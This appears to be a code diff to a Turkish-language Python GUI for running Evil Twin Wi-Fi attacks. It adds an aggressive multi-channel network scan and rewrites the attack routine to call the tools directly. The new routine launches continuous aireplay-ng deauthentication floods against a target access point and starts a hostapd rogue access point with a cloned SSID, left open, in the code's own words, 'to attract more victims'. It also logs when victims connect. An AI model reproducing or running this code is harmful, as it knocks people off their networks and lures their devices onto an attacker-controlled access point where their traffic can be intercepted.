@@ -143,13 +143,19 @@ class EvilTwinGUI:
         ttk.Button(control_frame, text="🔍+ Geniş Tarama", 
                   command=self.start_extended_scan).grid(row=0, column=3, padx=5, pady=5)
         
+        ttk.Button(control_frame, text="🔍🔍 Maksimum Tarama", 
+                  command=self.start_maximum_scan).grid(row=0, column=4, padx=5, pady=5)
+        
         # Tarama seçenekleri
         options_frame = ttk.Frame(control_frame)
-        options_frame.grid(row=1, column=0, columnspan=4, sticky='w', padx=5, pady=5)
+        options_frame.grid(row=1, column=0, columnspan=5, sticky='w', padx=5, pady=5)
         
         self.scan_all_channels_var = tk.BooleanVar(value=True)
         ttk.Checkbutton(options_frame, text="Tüm kanalları tara", 
                        variable=self.scan_all_channels_var).pack(side='left', padx=5)
+                       
+        ttk.Button(options_frame, text="📊 Teşhis", 
+                  command=self.run_diagnostics).pack(side='left', padx=5)
         
         # Ağ listesi
         networks_frame = ttk.LabelFrame(scan_frame, text="Bulunan Ağlar")
@@ -866,6 +872,112 @@ sudo systemctl restart NetworkManager
             self.scan_time_var.set(original_time)
         self._safe_after(1000, restore_time)  # 1 saniye sonra geri yükle
         
+    def start_maximum_scan(self):
+        """Maksimum ağ taraması - tüm yöntemleri dene"""
+        import platform
+        
+        if platform.system() == "Windows":
+            self._safe_messagebox("showwarning",
+                "Platform Uyarısı",
+                "Ağ tarama özelliği Linux/Unix sistemlerde çalışır."
+            )
+            return
+            
+        if not self.monitor_active:
+            self._safe_messagebox("showerror", "Hata", "Önce monitor mode'u başlatın")
+            return
+            
+        if self.scan_active:
+            self._safe_messagebox("showwarning", "Uyarı", "Tarama zaten aktif")
+            return
+        
+        # Maksimum tarama için 120 saniye
+        original_time = self.scan_time_var.get()
+        self.scan_time_var.set("120")
+        
+        self.log_message("MAKSIMUM ağ taraması başlatılıyor (120 saniye, tüm yöntemler)...")
+        
+        self.scan_active = True
+        try:
+            self.scan_btn.config(text="⏳ MAKSIMUM Tarama... (🚫 Durdurmak için tıkla)", state='normal')
+        except (tk.TclError, RuntimeError):
+            pass
+        
+        # Ağ listesini temizle
+        for item in self.networks_tree.get_children():
+            self.networks_tree.delete(item)
+            
+        # Maksimum taramayı thread'de başlat
+        scan_thread = threading.Thread(target=self._maximum_scan_networks)
+        scan_thread.daemon = True
+        scan_thread.start()
+        
+        # Orijinal süreyi geri yükle
+        def restore_time():
+            self.scan_time_var.set(original_time)
+        self._safe_after(1000, restore_time)
+        
+    def run_diagnostics(self):
+        """Ağ tarama teşhisi çalıştır"""
+        try:
+            self.log_message("Ağ tarama teşhisi başlatılıyor...")
+            
+            # 1. Monitor interface kontrolü
+            monitor_interface = self.monitor_interface_var.get()
+            if not monitor_interface:
+                self.log_message("❌ Monitor interface tanımlı değil", "ERROR")
+                return
+                
+            # 2. Interface durumu
+            result = subprocess.run(['iwconfig', monitor_interface], 
+                                  capture_output=True, text=True)
+            if result.returncode == 0:
+                if 'Mode:Monitor' in result.stdout:
+                    self.log_message(f"✅ {monitor_interface} monitor modda çalışıyor")
+                else:
+                    self.log_message(f"❌ {monitor_interface} monitor modda değil", "ERROR")
+            else:
+                self.log_message(f"❌ {monitor_interface} interface bulunamadı", "ERROR")
+                
+            # 3. Kullanılabilir kanallar
+            channels_result = subprocess.run(['iwlist', monitor_interface, 'channel'], 
+                                           capture_output=True, text=True)
+            if channels_result.returncode == 0:
+                channel_count = channels_result.stdout.count('Channel')
+                self.log_message(f"📶 {channel_count} kanal destekleniyor")
+            
+            # 4. Çevre ağları hızlı kontrol
+            self.log_message("🔍 Hızlı çevre tarama...")
+            quick_result = subprocess.run(['sudo', 'timeout', '5', 'airodump-ng', 
+                                         '--write-interval', '1', monitor_interface], 
+                                        capture_output=True, text=True)
+            
+            # 5. iwlist ile karşılaştırma
+            base_interface = monitor_interface.replace('mon', '')
+            iwlist_result = subprocess.run(['sudo', 'iwlist', base_interface, 'scan'], 
+                                         capture_output=True, text=True, timeout=10)
+            
+            if iwlist_result.returncode == 0:
+                iwlist_count = iwlist_result.stdout.count('Cell')
+                self.log_message(f"📱 iwlist {iwlist_count} ağ buldu")
+                
+                if iwlist_count > 5:
+                    self.log_message("💡 Çevrede çok ağ var ama airodump-ng bulamayabilir")
+                    self.log_message("🔧 Çözüm: 'Maksimum Tarama' deneyin")
+                elif iwlist_count < 3:
+                    self.log_message("🏠 Bu bölgede gerçekten az WiFi ağı var")
+                    self.log_message("🚩 Tavsiye: Daha kalabalık bir alana gidin")
+                    
+            # 6. Öneriler
+            self.log_message("\n💡 DAHA FAZLA AĞ BULMAK İÇİN:")
+            self.log_message("1. '🔍🔍 Maksimum Tarama' deneyin")
+            self.log_message("2. Farklı bir konuma gidin (apartman, ofis bölgesi)")
+            self.log_message("3. WiFi adaptörünüzün menzilini kontrol edin")
+            self.log_message("4. 5GHz desteği için modern adaptör kullanın")
+            
+        except Exception as e:
+            self.log_message(f"Teşhis hatası: {e}", "ERROR")
+        
         # Ağ listesini temizle
         for item in self.networks_tree.get_children():
             self.networks_tree.delete(item)
@@ -1061,6 +1173,130 @@ sudo systemctl restart NetworkManager
             
         except Exception as e:
             self.log_message(f"Geniş tarama hatası: {e}", "ERROR")
+        finally:
+            self.scan_active = False
+            self._safe_after(0, lambda: self._safe_widget_config(self.scan_btn, text="🔍 Taramayı Başlat", state='normal'))
+            
+    def _maximum_scan_networks(self):
+        """Maksimum ağ taraması - tüm yöntemleri kullan"""
+        try:
+            monitor_interface = self.monitor_interface_var.get()
+            
+            if not monitor_interface:
+                self.log_message("Monitor interface bulunamadı", "ERROR")
+                return
+            
+            self.log_message("🚀 MAKSIMUM TARAMA BAŞLATILIYOR...")
+            
+            # 1. PHASE: Önemli kanalları yoğun tara
+            priority_channels = [1, 6, 11, 36, 40, 44, 48]  # En popüler kanallar
+            self.log_message(f"1. FAZE: Önemli kanallar ({len(priority_channels)} kanal, 10sn her biri)...")
+            
+            import tempfile
+            import time
+            
+            for channel in priority_channels:
+                if not self.scan_active:
+                    break
+                    
+                try:
+                    # Kanalı değiştir
+                    subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', str(channel)], 
+                                 capture_output=True, timeout=3)
+                    
+                    self.log_message(f"  📶 Kanal {channel} yoğun tarama (10sn)...")
+                    
+                    # Uzun tarama
+                    temp_dir = tempfile.mkdtemp()
+                    output_file = os.path.join(temp_dir, f"max_ch{channel}")
+                    
+                    cmd = [
+                        'sudo', 'timeout', '10',
+                        'airodump-ng', 
+                        '--write', output_file,
+                        '--output-format', 'csv',
+                        '--channel', str(channel),
+                        monitor_interface
+                    ]
+                    
+                    subprocess.run(cmd, capture_output=True, text=True)
+                    
+                    csv_file = f"{output_file}-01.csv"
+                    if os.path.exists(csv_file):
+                        self._parse_airodump_csv(csv_file)
+                    
+                    import shutil
+                    try:
+                        shutil.rmtree(temp_dir)
+                    except:
+                        pass
+                        
+                except Exception as e:
+                    self.log_message(f"Kanal {channel} hatası: {e}", "WARNING")
+            
+            if not self.scan_active:
+                return
+                
+            # 2. PHASE: Tüm diğer kanalları hızlı tara
+            all_other_channels = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13, 149, 153, 157, 161, 165]
+            self.log_message(f"2. FAZE: Diğer kanallar ({len(all_other_channels)} kanal, 3sn her biri)...")
+            
+            for channel in all_other_channels:
+                if not self.scan_active:
+                    break
+                    
+                try:
+                    subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', str(channel)], 
+                                 capture_output=True, timeout=2)
+                    
+                    temp_dir = tempfile.mkdtemp()
+                    output_file = os.path.join(temp_dir, f"scan_ch{channel}")
+                    
+                    cmd = [
+                        'sudo', 'timeout', '3',
+                        'airodump-ng', 
+                        '--write', output_file,
+                        '--output-format', 'csv',
+                        '--channel', str(channel),
+                        monitor_interface
+                    ]
+                    
+                    subprocess.run(cmd, capture_output=True, text=True)
+                    
+                    csv_file = f"{output_file}-01.csv"
+                    if os.path.exists(csv_file):
+                        self._parse_airodump_csv(csv_file)
+                    
+                    import shutil
+                    try:
+                        shutil.rmtree(temp_dir)
+                    except:
+                        pass
+                        
+                except Exception as e:
+                    continue  # Sessizce devam et
+            
+            if not self.scan_active:
+                return
+                
+            # 3. PHASE: iwlist ile kapsamlı tarama
+            self.log_message("3. FAZE: iwlist ile kapsamlı tarama...")
+            self._try_iwlist_scan(monitor_interface)
+            
+            # Sonuç raporu
+            unique_count = len(set(network['bssid'] for network in self.networks))
+            self.log_message(f"\n🏁 MAKSIMUM TARAMA TAMAMLANDI")
+            self.log_message(f"📊 TOPLAM {unique_count} BENZERSİZ AĞ BULUNDU")
+            
+            if unique_count < 5:
+                self.log_message("\n📌 Az ağ bulunmasının nedenleri:")
+                self.log_message("1. 🏠 Bu bölgede gerçekten az WiFi ağı var")
+                self.log_message("2. 📶 WiFi adaptörünüzün menzili sınırlı olabilir")
+                self.log_message("3. 🏢 Daha kalabalık bir alana gidin (ofis, apartman)")
+                self.log_message("4. 📱 Modern bir WiFi adaptörü deneyin")
+            
+        except Exception as e:
+            self.log_message(f"Maksimum tarama hatası: {e}", "ERROR")
         finally:
             self.scan_active = False
             self._safe_after(0, lambda: self._safe_widget_config(self.scan_btn, text="🔍 Taramayı Başlat", state='normal'))
@@ -1361,83 +1597,400 @@ sudo systemctl restart NetworkManager
         attack_thread.start()
         
     def _start_attack(self):
-        """Saldırı işlemi (thread)"""
+        """Saldırı işlemi (thread) - Direkt komutlar kullanımı"""
         try:
-            # Komut oluştur
-            cmd = ['sudo', './scripts/start_evil_twin.sh']
-            cmd.extend(['-b', self.target_bssid_var.get()])
-            cmd.extend(['-c', self.target_channel_var.get()])
+            self.log_message("🚀 Evil Twin saldırısı başlatılıyor...")
             
-            if self.fake_ssid_var.get():
-                cmd.extend(['-f', self.fake_ssid_var.get()])
-                
-            if not self.captive_portal_var.get():
-                cmd.append('-p')
-                
+            # Status güncellemesi
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[BAŞLATILIYOR] Evil Twin saldırısı hazırlanıyor...\n"))
+            
+            # Hedef bilgileri
+            target_bssid = self.target_bssid_var.get()
+            target_channel = self.target_channel_var.get()
+            fake_ssid = self.fake_ssid_var.get() or self.target_ssid_var.get()
+            monitor_interface = self.monitor_interface_var.get()
+            
+            if not all([target_bssid, target_channel, monitor_interface]):
+                self.log_message("❌ Eksik hedef bilgileri", "ERROR")
+                self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[HATA] Eksik hedef bilgileri!\n"))
+                return
+            
+            self.log_message(f"🎯 Hedef: {fake_ssid} ({target_bssid})")
+            self.log_message(f"📶 Kanal: {target_channel}")
+            
+            # Status güncellemesi
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HEDEF] SSID: {fake_ssid}\n"))
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HEDEF] BSSID: {target_bssid}\n"))
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HEDEF] Kanal: {target_channel}\n"))
+            
+            # 1. ADIM: Kanal ayarla
+            self.log_message("1. Kanal ayarlanıyor...")
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[1/3] Kanal {target_channel} ayarlanıyor...\n"))
+            
+            channel_result = subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', target_channel], 
+                                           capture_output=True, text=True)
+            
+            if channel_result.returncode == 0:
+                self.log_message(f"✅ Kanal {target_channel} ayarlandı")
+                self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[BAŞARILI] Kanal {target_channel} ayarlandı\n"))
+            else:
+                self.log_message(f"❌ Kanal ayarlama hatası: {channel_result.stderr}", "ERROR")
+                self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HATA] Kanal ayarlama başarısız\n"))
+                return
+            
+            # Process referansları
+            self.attack_processes = []
+            
+            # 2. ADIM: Deauth saldırısı (eğer seçilmişse)
             if self.deauth_var.get():
-                cmd.append('-d')
+                self.log_message("2. Deauth saldırısı başlatılıyor...")
+                self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[2/3] Deauth saldırısı başlatılıyor...\n"))
                 
-            if self.sslstrip_var.get():
-                cmd.append('-S')
+                deauth_cmd = [
+                    'sudo', 'aireplay-ng',
+                    '--deauth', '0',  # Sürekli deauth
+                    '-a', target_bssid,
+                    monitor_interface
+                ]
                 
-            if self.dns_spoof_var.get():
-                cmd.append('-D')
-                
-            self.log_message(f"Saldırı başlatılıyor: {' '.join(cmd)}")
-            
-            # Saldırıyı başlat
-            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
-            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-            self.attack_process = subprocess.Popen(
-                cmd, 
-                stdout=subprocess.PIPE, 
-                stderr=subprocess.STDOUT,
-                universal_newlines=True,
-                cwd=script_dir
-            )
-            
-            # Çıktıyı oku
-            for line in iter(self.attack_process.stdout.readline, ''):
-                if line:
-                    self._safe_after(0, lambda l=line: self._safe_text_insert(self.attack_status_text, l))
-                    self._safe_after(0, lambda: self._safe_text_see_end(self.attack_status_text))
+                try:
+                    # Deauth'u arkaplanda çalıştır
+                    self.deauth_process = subprocess.Popen(deauth_cmd, 
+                                                         stdout=subprocess.PIPE, 
+                                                         stderr=subprocess.PIPE,
+                                                         text=True)
+                    self.attack_processes.append(self.deauth_process)
                     
-                if not self.attack_active:
-                    break
+                    self.log_message("✅ Deauth saldırısı başlatıldı")
+                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[BAŞARILI] Deauth saldırısı aktif\n"))
                     
+                    # Deauth çıktısını izle
+                    import time
+                    time.sleep(2)  # Başlatması için bekle
+                    
+                    if self.deauth_process.poll() is None:
+                        self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[DEAUTH] Sürekli deauth paketleri gönderiliyor...\n"))
+                    else:
+                        try:
+                            error_output = self.deauth_process.stderr.read() if self.deauth_process.stderr else "Bilinmeyen hata"
+                        except:
+                            error_output = "Stderr okunamadı"
+                        self.log_message(f"Deauth hatası: {error_output}", "ERROR")
+                        self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HATA] Deauth başarısız: {error_output}\n"))
+                        
+                except Exception as e:
+                    self.log_message(f"Deauth başlatma hatası: {e}", "ERROR")
+                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HATA] Deauth başlatılamadı: {e}\n"))
+            
+            # 3. ADIM: Sahte AP oluştur (hostapd)
+            if self.captive_portal_var.get():
+                self.log_message("3. Sahte Access Point oluşturuluyor...")
+                self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[3/3] Sahte Access Point oluşturuluyor...\n"))
+                
+                # Monitor interface'i normal moda çevir (hostapd için gerekli)
+                # Önce yeni bir interface oluştur
+                base_interface = monitor_interface.replace('mon', '')
+                
+                try:
+                    # hostapd konfigurasyonu oluştur
+                    import tempfile
+                    import os
+                    
+                    # Geçici konfigrasyon dosyası
+                    self.temp_dir = tempfile.mkdtemp()
+                    hostapd_conf = os.path.join(self.temp_dir, 'hostapd.conf')
+                    
+                    # Daha detaylı hostapd konfigurasyonu
+                    config_content = f"""# Evil Twin AP Configuration
+interface={base_interface}
+driver=nl80211
+ssid={fake_ssid}
+hw_mode=g
+channel={target_channel}
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=0
+# Open network (no encryption) to attract more victims"""
+                    
+                    with open(hostapd_conf, 'w') as f:
+                        f.write(config_content)
+                    
+                    self.log_message(f"Hostapd config oluşturuldu: {hostapd_conf}")
+                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[CONFIG] Hostapd yapılandırması oluşturuldu\n"))
+                    
+                    # Monitor mode'u durdur ve normal interface'i aktifleştir
+                    subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_interface], 
+                                 capture_output=True, text=True)
+                    
+                    import time
+                    time.sleep(2)
+                    
+                    # Interface'i up yap
+                    subprocess.run(['sudo', 'ifconfig', base_interface, 'up'], 
+                                 capture_output=True, text=True)
+                    
+                    # hostapd'i başlat
+                    hostapd_cmd = ['sudo', 'hostapd', '-d', hostapd_conf]  # -d için debug
+                    
+                    self.log_message(f"Hostapd başlatılıyor: {' '.join(hostapd_cmd)}")
+                    
+                    self.hostapd_process = subprocess.Popen(
+                        hostapd_cmd,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT,
+                        universal_newlines=True,
+                        bufsize=1  # Line buffered
+                    )
+                    
+                    self.attack_processes.append(self.hostapd_process)
+                    
+                    self.log_message("✅ Hostapd başlatıldı, çıktı izleniyor...")
+                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[HOSTAPD] Sahte AP başlatıldı, çıktı izleniyor...\n"))
+                    
+                    # Hostapd çıktısını gerçek zamanlı izle
+                    import time
+                    line_count = 0
+                    
+                    while self.attack_active and self.hostapd_process.poll() is None:
+                        try:
+                            if self.hostapd_process.stdout:
+                                line = self.hostapd_process.stdout.readline()
+                            else:
+                                break
+                            if line:
+                                line = line.strip()
+                                line_count += 1
+                                
+                                # Önemli mesajları logla
+                                if any(keyword in line.lower() for keyword in ['error', 'fail', 'success', 'enabled', 'sta']):
+                                    self.log_message(f"Hostapd: {line}")
+                                
+                                # Status ekranına ekle
+                                self._safe_after(0, lambda l=line: self._safe_text_insert(self.attack_status_text, f"[HOSTAPD] {l}\n"))
+                                self._safe_after(0, lambda: self._safe_text_see_end(self.attack_status_text))
+                                
+                                # Başarı kontrolü
+                                if 'AP-ENABLED' in line or 'Setup of interface done' in line:
+                                    self.log_message("🎉 Sahte AP başarıyla aktif!")
+                                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[BAŞARILI] 🎉 SAHTE AP AKTİF! Kurbanlar bağlanabilir...\n"))
+                                elif 'AP-STA-CONNECTED' in line or 'STA' in line and 'associated' in line:
+                                    self.log_message("📱 Bir cihaz sahte AP'ye bağlandı!")
+                                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[KURBAN] 📱 Bir cihaz bağlandı!\n"))
+                                elif 'failed' in line.lower() or 'error' in line.lower():
+                                    self.log_message(f"Hostapd hatası: {line}", "ERROR")
+                            
+                            # Her 50 satırda bir durum güncellemesi
+                            if line_count % 50 == 0:
+                                self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[INFO] Sahte AP çalışıyor... ({line_count} log satırı)\n"))
+                                
+                        except Exception as e:
+                            self.log_message(f"Hostapd çıktı okuma hatası: {e}", "ERROR")
+                            break
+                            
+                        time.sleep(0.1)  # CPU kullanımını azalt
+                    
+                    # Process sonlandıysa nedeni kontrol et
+                    if self.hostapd_process.poll() is not None:
+                        return_code = self.hostapd_process.returncode
+                        self.log_message(f"Hostapd sonlandı (kod: {return_code})", "WARNING")
+                        self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[UYARI] Hostapd sonlandı (kod: {return_code})\n"))
+                    
+                except Exception as e:
+                    self.log_message(f"Hostapd hatası: {e}", "ERROR")
+                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HATA] Hostapd başarısız: {e}\n"))
+            
+            else:
+                # Sadece deauth saldırısı - sürekli çalışsın
+                self.log_message("💥 Sadece deauth saldırısı çalışıyor...")
+                self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[DEAUTH] Sadece deauth modu - sürekli çalışıyor...\n"))
+                
+                # Deauth durumunu izle
+                while self.attack_active:
+                    if hasattr(self, 'deauth_process') and self.deauth_process:
+                        if self.deauth_process.poll() is not None:
+                            # Yeniden başlat
+                            self.log_message("Deauth yeniden başlatılıyor...")
+                            deauth_cmd = [
+                                'sudo', 'aireplay-ng',
+                                '--deauth', '0',
+                                '-a', target_bssid,
+                                monitor_interface
+                            ]
+                            self.deauth_process = subprocess.Popen(deauth_cmd, 
+                                                                 stdout=subprocess.PIPE, 
+                                                                 stderr=subprocess.PIPE,
+                                                                 text=True)
+                            self.attack_processes.append(self.deauth_process)
+                            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[DEAUTH] Yeniden başlatıldı\n"))
+                    
+                    import time
+                    time.sleep(5)  # 5 saniye kontrol aralığı
+                
         except Exception as e:
-            self.log_message(f"Saldırı hatası: {e}", "ERROR")
+            self.log_message(f"🚨 Saldırı hatası: {e}", "ERROR")
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HATA] Kritik hata: {e}\n"))
         finally:
             self._safe_after(0, self._attack_finished)
             
     def stop_attack(self):
         """Saldırıyı durdur"""
+        self.log_message("🛱 Evil Twin saldırısı durduruluyor...")
         self.attack_active = False
         
+        # Status güncelle
+        self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "\n[DURDURULUYOR] Saldırı sonlandırılıyor...\n"))
+        
         try:
-            if hasattr(self, 'attack_process'):
-                self.attack_process.terminate()
-                
-            # Cleanup scripti çalıştır
-            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
-            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-            subprocess.run(['sudo', './scripts/cleanup.sh'], cwd=script_dir)
+            # Tüm attack process'leri durdur
+            if hasattr(self, 'attack_processes'):
+                for process in self.attack_processes:
+                    try:
+                        if process and process.poll() is None:
+                            self.log_message(f"Process durduruluyor: PID {process.pid}")
+                            process.terminate()
+                            
+                            # 3 saniye bekle
+                            import time
+                            time.sleep(3)
+                            
+                            # Hala çalışıyorsa zorla öldür
+                            if process.poll() is None:
+                                process.kill()
+                                self.log_message(f"Process zorla sonlandırıldı: PID {process.pid}")
+                    except Exception as e:
+                        self.log_message(f"Process sonlandırma hatası: {e}", "WARNING")
             
-            self.log_message("Saldırı durduruldu")
+            # Hostapd process'i özel olarak durdur
+            if hasattr(self, 'hostapd_process') and self.hostapd_process:
+                try:
+                    if self.hostapd_process.poll() is None:
+                        self.log_message("Hostapd durduruluyor...")
+                        self.hostapd_process.terminate()
+                        
+                        import time
+                        time.sleep(2)
+                        
+                        if self.hostapd_process.poll() is None:
+                            self.hostapd_process.kill()
+                            
+                        self.log_message("✅ Hostapd durduruldu")
+                        self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[DURDURULDU] Hostapd sonlandırıldı\n"))
+                except Exception as e:
+                    self.log_message(f"Hostapd durdurma hatası: {e}", "WARNING")
+            
+            # Deauth process'i durdur
+            if hasattr(self, 'deauth_process') and self.deauth_process:
+                try:
+                    if self.deauth_process.poll() is None:
+                        self.log_message("Deauth durduruluyor...")
+                        self.deauth_process.terminate()
+                        
+                        import time
+                        time.sleep(1)
+                        
+                        if self.deauth_process.poll() is None:
+                            self.deauth_process.kill()
+                            
+                        self.log_message("✅ Deauth durduruldu")
+                        self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[DURDURULDU] Deauth sonlandırıldı\n"))
+                except Exception as e:
+                    self.log_message(f"Deauth durdurma hatası: {e}", "WARNING")
+            
+            # Monitor mode'u yeniden başlat (eğer hostapd kullanıldıysa)
+            monitor_interface = self.monitor_interface_var.get()
+            if monitor_interface and hasattr(self, 'hostapd_process'):
+                try:
+                    base_interface = monitor_interface.replace('mon', '')
+                    self.log_message(f"Monitor mode yeniden başlatılıyor: {base_interface}")
+                    
+                    # Interface'i down yap
+                    subprocess.run(['sudo', 'ifconfig', base_interface, 'down'], 
+                                 capture_output=True, timeout=5)
+                    
+                    # Monitor mode'u yeniden başlat
+                    subprocess.run(['sudo', 'airmon-ng', 'start', base_interface], 
+                                 capture_output=True, timeout=10)
+                    
+                    # Yeni monitor interface adını güncelle
+                    import time
+                    time.sleep(2)
+                    
+                    # iwconfig ile kontrol et ve güncelle
+                    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
+                    if result.returncode == 0:
+                        for line in result.stdout.split('\n'):
+                            if 'Mode:Monitor' in line and base_interface in line:
+                                parts = line.split()
+                                if len(parts) > 0:
+                                    new_monitor = parts[0]
+                                    self.monitor_interface_var.set(new_monitor)
+                                    self.log_message(f"✅ Monitor mode restore: {new_monitor}")
+                                    break
+                    
+                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "[RESTORE] Monitor mode yeniden aktif\n"))
+                    
+                except Exception as e:
+                    self.log_message(f"Monitor mode restore hatası: {e}", "WARNING")
+                    self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[UYARI] Monitor mode restore başarısız: {e}\n"))
+            
+            # Geçici dosyaları temizle
+            if hasattr(self, 'temp_dir'):
+                try:
+                    import shutil
+                    shutil.rmtree(self.temp_dir)
+                    self.log_message("Geçici dosyalar temizlendi")
+                except Exception as e:
+                    self.log_message(f"Geçici dosya temizleme hatası: {e}", "WARNING")
+            
+            # Ek temizlik işlemleri - tüm aireplay-ng process'leri durdur
+            try:
+                subprocess.run(['sudo', 'pkill', '-f', 'aireplay-ng'], 
+                             capture_output=True, timeout=5)
+                subprocess.run(['sudo', 'pkill', '-f', 'hostapd'], 
+                             capture_output=True, timeout=5)
+                self.log_message("Ek temizlik işlemleri tamamlandı")
+            except Exception as e:
+                self.log_message(f"Ek temizlik hatası: {e}", "WARNING")
+            
+            self.log_message("✅ Saldırı başarıyla durduruldu")
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "\n[TAMAMLANDI] ✅ Saldırı başarıyla durduruldu!\n"))
             
         except Exception as e:
             self.log_message(f"Saldırı durdurma hatası: {e}", "ERROR")
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, f"[HATA] Durdurma hatası: {e}\n"))
             
     def _attack_finished(self):
         """Saldırı bittiğinde çağrılır"""
         try:
             self.attack_active = False
+            
+            # Status güncelle
+            self._safe_after(0, lambda: self._safe_text_insert(self.attack_status_text, "\n[BİTİRİLDİ] Evil Twin saldırısı sona erdi\n"))
+            
+            # Butonları güncelle
             if hasattr(self, 'attack_btn') and self.attack_btn and self.attack_btn.winfo_exists():
-                self.attack_btn.config(state='normal')
+                self.attack_btn.config(state='normal', text="🚀 Saldırıyı Başlat")
             if hasattr(self, 'stop_btn') and self.stop_btn and self.stop_btn.winfo_exists():
                 self.stop_btn.config(state='disabled')
+            
+            # Temizlik işlemleri
+            if hasattr(self, 'attack_processes'):
+                self.attack_processes.clear()
+            
+            if hasattr(self, 'hostapd_process'):
+                delattr(self, 'hostapd_process')
+            
+            if hasattr(self, 'deauth_process'):
+                delattr(self, 'deauth_process')
+            
+            self.log_message("ℹ️ Saldırı işlemi tamamlandı")
+            
         except (tk.TclError, RuntimeError):
             # Widget'lar yok edilmişse sessizce geç
+            self.attack_active = False
+        except Exception as e:
+            self.log_message(f"Attack finished hatası: {e}", "ERROR")
             self.attack_active = False
         
     def refresh_logs(self):
